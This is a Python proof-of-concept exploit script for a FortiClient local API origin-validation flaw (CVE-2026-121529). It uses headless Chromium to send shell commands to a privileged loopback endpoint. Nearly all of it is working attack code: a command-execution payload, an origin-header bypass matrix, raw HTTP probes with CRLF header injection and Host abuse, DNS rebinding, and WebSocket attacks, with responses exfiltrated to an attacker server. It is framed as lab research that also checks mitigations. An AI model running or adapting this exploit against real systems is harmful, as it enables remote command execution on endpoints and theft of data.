#!/usr/bin/env python3
# Archived for authorized security research only.
# Source: https://github.com/googlesky/CVE-2026-121529 (MIT)
"""
CVE-2026-121529 -- FortiClient local API origin validation error ("Fortinet2Shell").

PoC driver.  Runs a *real* browser (headless Chromium via Playwright) inside the same
network namespace as the FortiClient local API, so `http://127.0.0.1:9191` really is the
victim's loopback, exactly like on an endpoint that runs FortiClient.

The attack:
    1. the browser loads a malicious page served by a separate attacker container,
    2. the page's JavaScript does `fetch('http://127.0.0.1:9191/api/v1/privileged/session')`,
    3. the FortiClient local API executes the command that was handed to it,
    4. the attacker exfiltrates the API response back to their own server.

Modes:
    check      run the attack once, print the verdict
    exploit    same, plus verification of the on-disk proof of execution
    mitigation the same attack against a CORS-header-only remediation
    probe     origin-validation bypass matrix against the patched model
    raw        raw-socket HTTP probes (header injection, missing/duplicate Origin, Host abuse)
    rebind     DNS-rebinding style attack: the page origin == the API origin, so the browser
               applies no CORS check at all
    ws         the WebSocket surface, which no CORS policy governs
    0day       full sweep: bypass + raw + rebind + the "CORS-header-only remediation" residual
    all        everything
"""

import argparse
import json
import os
import socket
import sys
import time
from urllib.parse import quote

try:
    from playwright.sync_api import sync_playwright
except Exception as exc:  # pragma: no cover
    print("playwright is required: %r" % (exc,), file=sys.stderr)
    sys.exit(2)

TARGET = os.environ.get("FCT_TARGET", "http://127.0.0.1:9191")
ATTACKER = os.environ.get("ATTACKER_URL", "http://attacker-site:8080")
TOKEN = os.environ.get("FCT_TOKEN", "fct-local-agent-shared-secret")
TOKEN_HEADER = "x-fortipam-client"
RESULTS = os.environ.get("POC_RESULTS", "/results")
PROOF_DIR = os.path.join(RESULTS, "poc")
MARKER = os.path.join(RESULTS, "marker")
REBIND_HOST = "api.evil.test"
REBIND_PORT = 9191

CHROME_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-features=IsolateOrigins,site-per-process",
]

# A 1x1 PNG.  The executed command drops it into the artefact store; the page then
# loads it as an image.  If it decodes, the command really ran -- which is how a blind
# RCE becomes a *confirmed* one.
PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQ"
    "AAAABJRU5ErkJggg=="
)
DEFAULT_CMD = (
    "id > {marker}/browser-pwn.txt 2>&1; echo PWNED >> {marker}/browser-pwn.txt; "
    "echo '{png}' | base64 -d > {marker}/proof.png"
)


# --------------------------------------------------------------------- helpers


def list_proofs():
    try:
        return sorted(os.listdir(PROOF_DIR))
    except OSError:
        return []


def proof_files():
    out = []
    for name in list_proofs():
        p = os.path.join(PROOF_DIR, name)
        try:
            with open(p, encoding="utf-8") as fh:
                out.append(json.load(fh))
        except Exception:
            pass
    return out


def read_exfil():
    p = os.path.join(RESULTS, "exfil.jsonl")
    recs = []
    try:
        with open(p, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line:
                    try:
                        recs.append(json.loads(line))
                    except Exception:
                        recs.append({"raw": line})
    except OSError:
        pass
    return recs


def attacker_host():
    h = ATTACKER.split("//", 1)[-1].split("/")[0].split(":")[0]
    return h


def attacker_ip():
    try:
        return socket.gethostbyname(attacker_host())
    except Exception:
        return "127.0.0.1"


def ws_url():
    return TARGET.replace("https://", "wss://").replace("http://", "ws://") + "/ws"


# ------------------------------------------------------------------- the router


def make_router(origin_override=None, drop_origin=False, extra=None, rewrite=None):
    """Playwright router that can tamper with the request the browser makes.

    * origin_override : replace the `Origin` header with this value
    * drop_origin     : remove the `Origin` header entirely (native-client shape)
    * extra           : additional request headers
    * rewrite         : list of (url_prefix, replacement_prefix) -- emulates the DNS
                        rebinding step, where the browser keeps talking to the
                        attacker's host name but the packet goes to the loopback API.
    """

    def handler(route):
        req = route.request
        headers = {k.lower(): v for k, v in req.headers.items()}
        url = req.url
        if rewrite:
            for src, dst in rewrite:
                if url.startswith(src):
                    url = dst + url[len(src) :]
                    break
        if origin_override is not None:
            headers["origin"] = origin_override
        elif drop_origin:
            headers.pop("origin", None)
        if extra:
            for k, v in extra.items():
                headers[k.lower()] = v
        try:
            route.continue_(url=url, headers=headers)
        except Exception:
            try:
                route.abort()
            except Exception:
                pass

    return handler


# ------------------------------------------------------------------ the attack


def run_attack(
    pw,
    cmd=None,
    target=None,
    legacy=None,
    origin_override=None,
    drop_origin=False,
    extra=None,
    rewrite=None,
    rebind=False,
    label="attack",
):
    """Load the malicious page in a real browser and observe what happens."""
    cmd = cmd or DEFAULT_CMD.format(marker=MARKER, png=PNG_B64)
    target = target or (TARGET + "/api/v1/privileged/session")
    legacy = legacy or (TARGET + "/api/v1/privileged/session/legacy")
    proofs_before = {p.get("proof_id") for p in proof_files()}

    result = {
        "label": label,
        "target": target,
        "legacy": legacy,
        "cmd": cmd,
        "origin_override": origin_override,
        "drop_origin": drop_origin,
        "extra_headers": extra,
        "rebind": rebind,
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }

    args = list(CHROME_ARGS)
    if rebind:
        # Step 1 of a DNS rebinding attack: the attacker's name resolves to the
        # attacker's own server, so the malicious page is loaded from
        # http://api.evil.test:9191/ (same host:port as the API it will attack).
        args.append("--host-resolver-rules=MAP %s %s" % (REBIND_HOST, attacker_ip()))

    with pw.chromium.launch(headless=True, args=args) as browser:
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        console = []
        page.on("console", lambda m: console.append("%s: %s" % (m.type, m.text)))
        page.on("pageerror", lambda e: console.append("pageerror: %s" % e))

        rewrite = list(rewrite or [])
        if rebind:
            # The DNS rebinding step: the browser keeps using the attacker's host name
            # (so the request is *same-origin* and no CORS check applies at all), but the
            # packet is delivered to the FortiClient local API on the loopback.
            rewrite.insert(
                0,
                (
                    "http://%s:%d/api/" % (REBIND_HOST, REBIND_PORT),
                    TARGET + "/api/",
                ),
            )

        page.route(
            "**/*",
            make_router(
                origin_override=origin_override,
                drop_origin=drop_origin,
                extra=extra,
                rewrite=rewrite,
            ),
        )

        if rebind:
            page_url = "http://%s:%d/exploit.html" % (REBIND_HOST, REBIND_PORT)
            t = "http://%s:%d/api/v1/privileged/session" % (REBIND_HOST, REBIND_PORT)
            lg = "http://%s:%d/api/v1/privileged/session/legacy" % (REBIND_HOST, REBIND_PORT)
            fl = "http://%s:%d/api/v1/files/proof.png" % (REBIND_HOST, REBIND_PORT)
        else:
            page_url = ATTACKER + "/exploit.html"
            t = target
            lg = legacy
            fl = TARGET + "/api/v1/files/proof.png"

        url = "%s?target=%s&legacy=%s&cmd=%s&files=%s&ws=%s" % (
            page_url,
            quote(t, safe=""),
            quote(lg, safe=""),
            quote(cmd, safe=""),
            quote(fl, safe=""),
            quote(ws_url(), safe=""),
        )
        result["page_url"] = url
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=30000)
            page.wait_for_function(
                "() => window.__results && window.__results.attempts.length >= 6",
                timeout=30000,
            )
            page_results = page.evaluate("window.__results")
        except Exception as exc:
            page_results = {"error": str(exc)}
            try:
                page_results["partial"] = page.evaluate("window.__results")
            except Exception:
                pass
        result["page"] = page_results
        result["console"] = console[-20:]
        try:
            ctx.close()
        except Exception:
            pass

    # ---- verify what actually happened on the endpoint
    time.sleep(0.4)
    new_proofs = [
        p for p in proof_files() if p.get("proof_id") and p["proof_id"] not in proofs_before
    ]

    result["executed"] = len(new_proofs) > 0
    result["proofs"] = new_proofs
    result["proof_count"] = len(new_proofs)
    result["channels_executed"] = sorted({p.get("channel") for p in new_proofs if p.get("channel")})
    # The <img> cross-origin GET carries no Origin header at all.
    result["img_csrf_executed"] = any(p.get("channel") == "query" for p in new_proofs)
    result["origins_seen"] = sorted({str(p.get("origin")) for p in new_proofs})
    attempts = (page_results or {}).get("attempts") or []
    ws_att = [a for a in attempts if a.get("name") == "websocket"]
    conf_att = [a for a in attempts if a.get("name") == "confirm-oracle"]
    result["websocket_opened"] = bool(ws_att and ws_att[0].get("opened"))
    result["websocket_readable"] = bool(ws_att and ws_att[0].get("readable"))
    result["websocket_executed"] = any(p.get("channel") == "websocket" for p in new_proofs)
    result["confirmed"] = bool(conf_att and conf_att[0].get("confirmed"))

    attempts = (page_results or {}).get("attempts") or []
    readable = [
        a
        for a in attempts
        if a.get("readable")
        and isinstance(a.get("body"), str)
        and ("proof_id" in a["body"] or "PWNED" in a["body"] or "uid=" in a["body"])
    ]
    result["readable"] = len(readable) > 0
    result["readable_attempts"] = readable
    result["exfiltrated"] = bool(read_exfil())
    result["marker_present"] = os.path.exists(MARKER + "/browser-pwn.txt")
    return result


# --------------------------------------------------------------- raw HTTP probes


def raw_probe(path="/api/v1/privileged/session", headers=None, method="POST", body=None):
    """Send a hand-crafted HTTP request to the local API (no browser involved)."""
    host, port = TARGET.split("//", 1)[-1].split("/")[0].split(":")
    port = int(port)
    if body is None:
        body = json.dumps({"command": "id > %s/raw-pwn.txt 2>&1" % MARKER}).encode()
    lines = ["%s %s HTTP/1.1" % (method, path), "Host: %s:%d" % (host, port)]
    for k, v in (headers or {}).items():
        lines.append("%s: %s" % (k, v))
    lines.append("Content-Type: application/json")
    lines.append("Content-Length: %d" % len(body))
    lines.append("Connection: close")
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(raw)
    data = b""
    s.settimeout(10)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    finally:
        s.close()
    return data.decode("utf-8", "replace")


# --------------------------------------------------------------- bypass matrix

BYPASS_CANDIDATES = [
    ("allowlisted-origin", "https://fortipam.fortinet.com", {}),
    ("allowlisted-origin-uppercase", "https://FORTIPAM.FORTINET.COM", {}),
    ("allowlisted-origin-trailing-dot", "https://fortipam.fortinet.com.", {}),
    ("allowlisted-origin-explicit-default-port", "https://fortipam.fortinet.com:443", {}),
    ("allowlisted-origin-zero-padded-port", "https://fortipam.fortinet.com:0443", {}),
    ("allowlisted-origin-trailing-space", "https://fortipam.fortinet.com ", {}),
    ("userinfo-confusion", "https://fortipam.fortinet.com@evil.example", {}),
    ("suffix-confusion", "https://fortipam.fortinet.com.evil.example", {}),
    ("prefix-confusion", "https://evilfortipam.fortinet.com", {}),
    ("parent-domain", "https://fortinet.com", {}),
    ("chrome-extension-origin", "chrome-extension://klbibpmmopcnogkgdclkbjoepgphcnak", {}),
    ("null-origin", "null", {}),
    ("null-origin-with-spoofed-fetch-metadata", "null", {"sec-fetch-site": "same-origin"}),
    ("wildcard-origin", "*", {}),
    ("same-origin-ipv4", "http://127.0.0.1:9191", {}),
    ("same-origin-localhost", "http://localhost:9191", {}),
    ("missing-origin-header", None, {}),
]


def bypass_matrix(pw, cmd, token=None):
    """Origin-validation bypass matrix.

    Pass 1 (token=None): the attacker knows nothing but the URL.  Every candidate must
    be rejected -- the patched model requires both a trusted origin and the shared
    secret header.

    Pass 2 (token=<lab secret>): the origin validator is tested in isolation.  Only a
    genuinely allow-listed origin may pass; every parser differential (case, trailing
    dot, explicit/zero-padded default port, userinfo, suffix, prefix, parent domain,
    `null`, wildcard, missing header) must still be rejected.
    """
    out = []
    for name, origin, extra in BYPASS_CANDIDATES:
        hdrs = dict(extra or {})
        if token:
            hdrs[TOKEN_HEADER] = token
        r = run_attack(
            pw,
            cmd=cmd,
            origin_override=origin,
            drop_origin=(origin is None),
            extra=hdrs or None,
            label="bypass:" + name,
        )
        r["candidate"] = name
        r["candidate_origin"] = origin
        r["token_supplied"] = bool(token)
        out.append(r)
    return out


def raw_probes(cmd):
    probes = [
        ("no-origin-header", {"User-Agent": "raw-probe"}),
        ("origin-null", {"Origin": "null"}),
        ("origin-allowlisted", {"Origin": "https://fortipam.fortinet.com"}),
        ("origin-untrusted", {"Origin": "http://evil.example"}),
        ("duplicate-origin", {"Origin": "https://fortipam.fortinet.com"}),
        ("origin-crlf-injection", {"Origin": "https://fortipam.fortinet.com\r\nX-Injected: yes"}),
        ("origin-with-space-list", {"Origin": "https://fortipam.fortinet.com http://evil.example"}),
        ("host-header-abuse", {"Host": "api.evil.test"}),
        ("forwarded-host-abuse", {"X-Forwarded-Host": "api.evil.test"}),
    ]
    results = []
    for name, hdrs in probes:
        # a second Origin header is genuinely duplicated
        if name == "duplicate-origin":
            resp = raw_probe_with_extra_header(hdrs, ("Origin", "http://evil.example"))
        else:
            resp = raw_probe(headers=hdrs)
        results.append(
            {
                "probe": name,
                "headers": {k: v.replace("\r\n", "\\r\\n") for k, v in hdrs.items()},
                "response": resp[:1200],
                "executed": '"proof_id"' in resp or '"ok": true' in resp,
                "injected_header": "x-injected" in resp.lower(),
            }
        )
    return results


def raw_probe_with_extra_header(headers, extra):
    host, port = TARGET.split("//", 1)[-1].split("/")[0].split(":")
    port = int(port)
    body = json.dumps({"command": "id > %s/raw-pwn.txt 2>&1" % MARKER}).encode()
    lines = [
        "POST /api/v1/privileged/session HTTP/1.1",
        "Host: %s:%d" % (host, port),
    ]
    for k, v in headers.items():
        lines.append("%s: %s" % (k, v))
    lines.append("%s: %s" % extra)
    lines.append("Content-Type: application/json")
    lines.append("Content-Length: %d" % len(body))
    lines.append("Connection: close")
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(raw)
    data = b""
    s.settimeout(10)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    finally:
        s.close()
    return data.decode("utf-8", "replace")


# ---------------------------------------------------------------------- main


def main():
    global TARGET, ATTACKER
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "mode",
        nargs="?",
        default="check",
        choices=[
            "check",
            "exploit",
            "mitigation",
            "probe",
            "raw",
            "rebind",
            "ws",
            "0day",
            "all",
        ],
    )
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--attacker", default=ATTACKER)
    ap.add_argument("--cmd", default=None)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    TARGET = args.target
    ATTACKER = args.attacker
    os.makedirs(PROOF_DIR, exist_ok=True)
    os.makedirs(MARKER, exist_ok=True)

    cmd = args.cmd or DEFAULT_CMD.format(marker=MARKER, png=PNG_B64)

    summary = {
        "mode": args.mode,
        "target": TARGET,
        "attacker": ATTACKER,
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    out = {}
    rc = 0

    # ---------------------------------------------------------------- reachability
    reachable = True
    try:
        host, port = TARGET.split("//", 1)[-1].split("/")[0].split(":")
        s = socket.create_connection((host, int(port)), timeout=5)
        s.close()
    except Exception as exc:
        reachable = False
        summary["unreachable"] = str(exc)
    if not reachable:
        print(json.dumps(out, indent=2, default=str))
        if args.out:
            with open(args.out, "w", encoding="utf-8") as fh:
                fh.write(json.dumps(out, indent=2, default=str))
        print("target unreachable: %s" % TARGET, file=sys.stderr)
        return 2

    with sync_playwright() as pw:
        if args.mode in ("check", "exploit", "mitigation", "ws", "all"):
            r = run_attack(pw, cmd=cmd, label=args.mode)
            out["attack"] = r
            summary["executed"] = r["executed"]
            summary["readable"] = r["readable"]
            summary["exfiltrated"] = r["exfiltrated"]
            summary["proof_count"] = r["proof_count"]
            summary["channels_executed"] = r["channels_executed"]
            summary["img_csrf_executed"] = r["img_csrf_executed"]
            summary["origins_seen"] = r["origins_seen"]
            summary["websocket_executed"] = r["websocket_executed"]
            summary["websocket_readable"] = r["websocket_readable"]
            summary["confirmed"] = r["confirmed"]
            if args.mode == "mitigation":
                # The CORS-header-only remediation: the primitive (command execution)
                # is confirmed, the gadget (reading the response) is blocked.
                if r["executed"] and not r["readable"]:
                    summary["verdict"] = "PRIMITIVE CONFIRMED / GADGET BLOCKED"
                    rc = 3
                elif r["executed"] and r["readable"]:
                    summary["verdict"] = "VULNERABLE"
                    rc = 1
                else:
                    summary["verdict"] = "SAFE"
                    rc = 0
            elif args.mode == "ws":
                # The WebSocket surface is not governed by CORS at all.
                if r["websocket_executed"]:
                    summary["verdict"] = (
                        "VULNERABLE (websocket)" if r["websocket_readable"] else
                        "PRIMITIVE CONFIRMED / GADGET BLOCKED"
                    )
                    rc = 1 if r["websocket_readable"] else 3
                else:
                    summary["verdict"] = "SAFE"
                    rc = 0
            else:
                if r["executed"] and r["readable"]:
                    summary["verdict"] = "VULNERABLE"
                    rc = 1
                elif r["executed"]:
                    summary["verdict"] = "EXECUTED / RESPONSE NOT READABLE"
                    rc = 3
                else:
                    summary["verdict"] = "SAFE"
                    rc = 0

        if args.mode in ("probe", "0day", "all"):
            out["bypass"] = bypass_matrix(pw, cmd)
            out["bypass_with_token"] = bypass_matrix(pw, cmd, token=TOKEN)
            summary["bypass_hits"] = [
                b["candidate"]
                for b in out["bypass"]
                if b.get("executed") or b.get("readable")
            ]
            # In the token-supplied pass the genuinely allow-listed origin is expected to
            # pass; anything else is an origin-validator bypass.
            summary["origin_validator_bypasses"] = [
                b["candidate"]
                for b in out["bypass_with_token"]
                if (b.get("executed") or b.get("readable"))
                and b["candidate"] != "allowlisted-origin"
            ]
            summary["origin_validator_baseline"] = [
                b["candidate"]
                for b in out["bypass_with_token"]
                if b.get("executed") and b["candidate"] == "allowlisted-origin"
            ]
            if summary["bypass_hits"] or summary["origin_validator_bypasses"]:
                rc = 1

        if args.mode in ("rebind", "0day", "all"):
            r = run_attack(pw, cmd=cmd, rebind=True, label="rebind")
            out["rebind"] = r
            summary["rebind_executed"] = r["executed"]
            summary["rebind_readable"] = r["readable"]
            if r["executed"] and args.mode != "all":
                rc = 1

        if args.mode in ("raw", "0day", "all"):
            out["raw"] = raw_probes(cmd)
            summary["raw_hits"] = [
                p["probe"] for p in out["raw"] if p.get("executed") or p.get("injected_header")
            ]

    out["summary"] = summary
    out["exit_code"] = rc
    text = json.dumps(out, indent=2, default=str)
    print(text)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text)
    return rc


if __name__ == "__main__":
    sys.exit(main())
